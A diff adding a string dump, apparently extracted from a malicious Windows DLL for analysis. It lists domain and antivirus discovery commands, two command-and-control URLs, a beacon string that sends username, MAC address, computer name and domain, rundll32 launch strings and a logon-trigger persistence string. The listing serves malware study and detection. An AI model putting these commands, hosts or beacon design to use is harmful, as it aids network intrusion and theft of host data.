@@ -1,0 +1,80 @@
+0x180001e65: /c ipconfig /all
+0x180001ea0: C:\Windows\System32\cmd.exe
+0x180001efd: /c systeminfo
+0x180001f38: C:\Windows\System32\cmd.exe
+0x180001f96: /c nltest /domain_trusts
+0x180001fd1: C:\Windows\System32\cmd.exe
+0x18000202f: /c nltest /domain_trusts /all_trusts
+0x18000206a: C:\Windows\System32\cmd.exe
+0x1800020c8: /c net view /all /domain
+0x180002103: C:\Windows\System32\cmd.exe
+0x180002161: /c net view /all
+0x18000219c: C:\Windows\System32\cmd.exe
+0x1800021fa: /c net group "Domain Admi
+0x180002235: C:\Windows\System32\cmd.exe
+0x180002293: /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
+0x1800022ce: C:\Windows\System32\wbem\wmic.exe
+0x18000232c: /c net config workstation
+0x180002367: C:\Windows\System32\cmd.exe
+0x1800023c5: /c wmic.exe /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:dis
+0x180002400: C:\Windows\System32\cmd.exe
+0x18000245e: /c whoami /groups
+0x180002499: C:\Windows\System32\cmd.exe
+0x180002b6b: .dll
+0x180002ba3: .exe
+0x180002d8c: "%s"
+0x180002dd9: 
+0x180002e26: rundll32.exe
+0x180002e6e: "%s", %s %s
+0x1800031b1: runnung
+0x180003311: :wtfbbq
+0x180003a74: %d
+0x180003ac4: %s%s
+0x180003ba0: %s\%d.dll
+0x180003c6f: %d.dat
+0x180003cc8: %s\%s
+0x180003d97: init -zzzz="%s\%s"
+0x180003621: b'front\x00'
+0x180003765: b'/files/\x00'
+0x180003ed9: b'Novik\x00'
+0x180004322: .exe
+0x180004802: b'Content-Type: application/x-www-form-urlencoded\x00'
+0x18000488c: b'POST\x00'
+0x18000490c: b'GET\x00'
+0x18000453c: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
+0x1800045cf: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
+0x180004ce2: b'CLEARURL\x00'
+0x180004d40: b'URLS\x00'
+0x180004dd6: b'COMMAND\x00'
+0x180004e56: b'ERROR\x00'
+0x180004f5c: b'12345\x00'
+0x180005273: b'counter=%d&type=%d&guid=%s&os=%d&arch=%d&username=%s&group=%lu&ver=%d.%d&up=%d&direction=%s\x00'
+0x18000535f: b'counter=%d&type=%d&guid=%s&os=%d&arch=%d&username=%s&group=%lu&ver=%d.%d&up=%d&direction=%s\x00'
+0x180005481: b'counter=%d&type=%d&guid=%s&os=%d&arch=%d&username=%s&group=%lu&ver=%d.%d&up=%d&direction=%s\x00'
+0x1800063d9: %s%d.dll
+0x180006569: %s%d.exe
+0x18000b5f4: LogonTrigger
+0x18000754c: b'&mac=\x00'
+0x18000babb: PT0S
+0x18000768d: ;
+0x1800075cd: b'%02x\x00'
+0x18000760e: b':%02x\x00'
+0x180007760: b'&computername=%s\x00'
+0x180007806: b'&domain=%s\x00'
+0x1800098c6: \*.dll
+0x180005f87: b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x00'
+0x180008171: b'%04X%04X%04X%04X%08X%04X\x00'
+0x180007e2a: \Registry\Machine\
+0x1800070da: AppData
+0x180007146: Desktop
+0x1800071b2: Startup
+0x18000721e: Personal
+0x18000728a: Local AppData
+0x1800072f9: Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+0x1800060c3: b'https://arsimonopa.com/live/\x00'
+0x18000612f: b'https://lemonimonakio.com/live/\x00'
+0x18000aa1d: C:\WINDOWS\SYSTEM32\rundll32.exe %s,%s
+0x18000aa77: C:\WINDOWS\SYSTEM32\rundll32.exe %s
+0x1800066ba: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
+0x18000c2d0: b'URLS\x00'
+0x18000c453: b'URLS|%d|%s\r\n\x00'
